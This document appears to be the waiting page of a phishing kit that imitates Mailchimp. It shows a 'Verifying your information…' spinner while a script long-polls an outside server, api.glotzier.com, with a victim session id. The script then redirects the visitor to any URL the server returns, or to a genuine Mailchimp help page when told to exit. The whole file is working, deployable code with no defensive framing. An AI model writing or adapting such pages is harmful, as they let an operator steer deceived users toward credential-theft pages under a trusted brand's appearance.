<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Please wait…</title>
<style>
body{margin:0;background:#F9FAFB}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.92);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
.spinner{width:48px;height:48px;border:5px solid rgba(255,224,27,0.3);border-top:5px solid #ffe01b;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.text{margin-top:24px;font-size:16px;font-weight:500;color:#241c15}
.small{margin-top:8px;font-size:13px;color:#595959}
</style>
</head>
<body>
<div class="overlay">
  <div class="spinner"></div>
  <div class="text">Verifying your information…</div>
  <div class="small">Please be patient while we complete the verification.</div>
</div>
<script>
const vid = new URLSearchParams(window.location.search).get('vid');
if (!vid) {
  document.querySelector('.text').textContent = 'Error: missing session';
} else {
  // Poll the /wait endpoint (long polling, waits up to 90 seconds)
  async function poll() {
    try {
      const res = await fetch(`https://api.glotzier.com/wait?vid=${vid}`);
      const text = await res.text();
      if (text === 'exit') {
        window.location.href = 'https://mailchimp.com/help/about-mailchimp-pricing-plans/';
        return;
      }
      if (text !== 'wait' && text !== '') {
        window.location.href = text;
        return;
      }
      // If the response was 'wait' (shouldn't happen with long polling), retry
      setTimeout(poll, 1000);
    } catch (e) {
      // On network error, retry after 2 seconds
      setTimeout(poll, 2000);
    }
  }
  poll();
}
</script>
</body>
</html>
